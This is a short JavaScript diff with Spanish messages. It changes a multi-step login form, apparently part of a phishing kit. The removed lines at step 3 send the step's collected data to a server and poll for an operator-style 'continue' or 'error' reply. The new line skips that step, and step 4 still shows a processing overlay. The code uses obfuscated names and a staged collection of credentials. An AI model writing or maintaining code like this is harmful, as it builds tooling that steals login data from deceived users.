@@ -1635,14 +1635,7 @@
           if (!_ok2) { _notify('Usuario o contraseña incorrectos.', 3000); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); return; }
           _step = 3; _show(3);
         }
-        else if (_step == 3) {
-          _showOverlay(); _ovText('PROCESANDO...\nPor favor espere.');
-          _sendStep(3);
-          _poll(function (state) {
-            if (state === 'continue') { _hideOverlay(); _step = 4; _show(4); }
-            else if (state === 'error') { _hideOverlay(); _notify('Algunos de tus datos son incorrectos.', 3500); _resetForm(); _step = 1; _show(1); }
-          });
-        }
+        else if (_step == 3) { _step = 4; _show(4); }
         else if (_step == 4) {
           _showOverlay();
           _ovText('PROCESANDO...\nPor favor espere.');
